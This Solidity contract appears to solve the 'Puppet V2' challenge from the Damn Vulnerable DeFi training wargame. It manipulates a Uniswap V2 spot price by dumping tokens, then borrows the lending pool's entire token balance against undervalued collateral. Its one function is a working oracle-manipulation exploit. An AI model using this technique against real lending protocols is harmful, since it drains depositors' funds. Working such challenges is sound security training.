// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract PuppetV2Attacker {
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    constructor(){

    }
    function attack(
        WETH weth,
        DamnValuableToken token,
        IUniswapV2Router02 uniswapV2Router,
        PuppetV2Pool lendingPool,
        address recovery
    ) public payable {
        weth.deposit{value: msg.value}();
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, address(this), block.timestamp + 1);
        uint256 amount = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), amount);
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
        weth.transfer(msg.sender, weth.balanceOf(address(this)));
    }
    function recieve() external payable {}
}
